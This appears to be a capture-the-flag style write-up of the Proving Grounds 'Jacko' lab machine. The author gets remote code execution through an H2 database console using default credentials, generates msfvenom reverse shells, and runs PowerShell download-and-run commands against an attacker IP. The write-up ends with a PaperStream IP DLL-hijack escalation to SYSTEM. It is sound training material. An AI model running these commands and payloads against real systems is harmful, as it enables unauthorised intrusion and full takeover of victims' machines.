---
description: Writeup for Jacko from Offensive Security Proving Grounds (PG)
---

# Jacko

## Information Gathering

### Service Enumeration

`nmapAutomator.sh -H 192.168.134.66 -t full`

![](../../.gitbook/assets/021d0b8afd7649f39fca8d24b8bbf7fb.png)

`nmapAutomator.sh -H 192.168.134.66 -t vulns`

![](../../.gitbook/assets/1072d5ba8679429aaeb01136da99232d.png)

### SMB

Null sessions not allowed

### HTTP

Port 80:

![](../../.gitbook/assets/34c2f6718a9b486c8d5790dcb7175e60.png)

Port 8082:

![](../../.gitbook/assets/666f9bc5257044d6bed3cdc7acc76aaa.png)

The default credentials `sa:` worked. Here we can run SQL queries.

![](../../.gitbook/assets/0bfad5b5c0984bf7a22935c519293093.png)

`SHOW DATABASES` shows us that there is a `PUBLIC` schema.

![](../../.gitbook/assets/7084ba7897af4583ac7b68e660231dfe.png)

However, further enumeration found nothing much interesting in the database.

We see the version of the product \(H2 1.4.199\). This version suffers from an RCE vulnerability.

![](../../.gitbook/assets/b79123062d834793a967f0c26b95e917.png)

Reference: [https://www.exploit-db.com/exploits/49384](https://www.exploit-db.com/exploits/49384)

If we execute the following SQL statements:

```text
-- Write native library
SELECT CSVWRITE('C:\Windows\Temp\JNIScriptEngine.dll', CONCAT('SELECT NULL "', CHAR(0x4d),CHAR(0x5a),CHAR(0x90), ... ,CHAR(0x00),CHAR(0x00),CHAR(0x00),CHAR(0x00),'"'), 'ISO-8859-1', '', '', '', '', '');

-- Load native library
CREATE ALIAS IF NOT EXISTS System_load FOR "java.lang.System.load";
CALL System_load('C:\Windows\Temp\JNIScriptEngine.dll');

-- Evaluate script
CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("whoami").getInputStream()).useDelimiter("\\Z").next()');
```

we can achieve RCE.

With this, we can run the `systeminfo` command. This shows us that the architecture is x64.

![](../../.gitbook/assets/ac23f5cc520b4c4c9c5fa4ef8af134d7.png)

`msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.49.103 LPORT=445 -f exe > reverse.exe`

**Note that ports like 4242, 4444, etc. did not work. I used port 445 since I realised that I was able to copy files via SMB, so it likely won't be blocked by the firewall.**

Copy the payload to the victim machine via SMB:

```sql
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("cmd.exe /c copy \\\\192.168.49.103\\ROPNOP\\reverse.exe c:\\users\\tony\\reverse.exe").getInputStream()).useDelimiter("\\Z").next()');
```

![](../../.gitbook/assets/209d74a651a148b18f8652c74a1c3fc3.png)

Running the payload:

```sql
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("c:\\users\\tony\\reverse.exe").getInputStream()).useDelimiter("\\Z").next()');
```

Receiving the reverse shell:

![](../../.gitbook/assets/364a758bbb304e99aaf1488d22bc523f.png)

![](../../.gitbook/assets/4efd57e982134262906d2d5ba26b4385.png)

### Privilege Escalation

#### SeImpersonatePrivilege

`c:\windows\system32\whoami.exe /priv`

We see that `SeImpersonatePrivilege` is enabled.

![](../../.gitbook/assets/22f6c74ab5294d5c859882a40b109743.png)

After we locate the location of `powershell.exe`, we can run powershell.

![](../../.gitbook/assets/a5793bbfd02e41a98d89c71345a6ef1d.png)

Using the `GetCLSID.ps1` script from [http://ohpe.it/juicy-potato/CLSID/](http://ohpe.it/juicy-potato/CLSID/), we can attempt to get CLSIDs.

`IEX (New-Object Net.WebClient).DownloadString('http://192.168.49.103/GetCLSID.ps1')`

![](../../.gitbook/assets/db1ad6867bb744199270e1242d9b5498.png)

This does not work because we cannot find any CLSIDs.

#### Windows OS Exploits

Transfer WinPEAS:

`$WebClient = New-Object System.Net.WebClient; $WebClient.DownloadFile("http://192.168.49.103/winPEASx86.exe","C:\users\tony\winPEASx86.exe")`

Run WinPEAS:

`c:\users\tony\winpeasx86.exe`

![](../../.gitbook/assets/348a5f7d010840c59a56d4843b05db60.png)

We could try these as a last resort.

#### Vulnerable Apps

**Took quite a while to figure this out. Always check for vulnerable apps if WinPEAS does not find anything useful!**

![](../../.gitbook/assets/fa85991e9b8340df8fed96b2c26388f7.png)

![](../../.gitbook/assets/7241af1f69a64de3bf9be18186832ce7.png)

We can check the PaperStream IP version, it is 1.42

![](../../.gitbook/assets/59a45612ea384eac8bcfd17c8ad03679.png)

This version is vulnerable to a privilege escalation vulnerability.

PaperStream IP exploit: [https://www.exploit-db.com/exploits/49382](https://www.exploit-db.com/exploits/49382)

`msfvenom -p windows/shell_reverse_tcp -f dll -o shell.dll LHOST=192.168.49.103 LPORT=445`

![](../../.gitbook/assets/b67212d77f5146f6a15675a63d98d0ae.png)

**I initially made the mistake of using an `x64` payload. Note that the application is found under `Program Files (x86)`, so it cannot use an `x64` DLL.**

`$WebClient = New-Object System.Net.WebClient; $WebClient.DownloadFile("http://192.168.49.103/shell.dll","C:\users\tony\shell.dll")`

`$WebClient = New-Object System.Net.WebClient; $WebClient.DownloadFile("http://192.168.49.103/49382.ps1","C:\users\tony\49382.ps1")`

Run the exploit: `C:\users\tony\49382.ps1`

![](../../.gitbook/assets/09234d8c21064bfd90fac875bd05e53d.png)

Once the exploit is triggered, we obtain our reverse shell.

![](../../.gitbook/assets/002ed5fe3e274bb2926b32474c8ebfe6.png)

The exploit works and we received a SYSTEM shell.

![](../../.gitbook/assets/ff7dd418cef0408e81323e49bafb1249.png)

![](../../.gitbook/assets/34ee540f2df94dcaaae6914ef1baa47e.png)

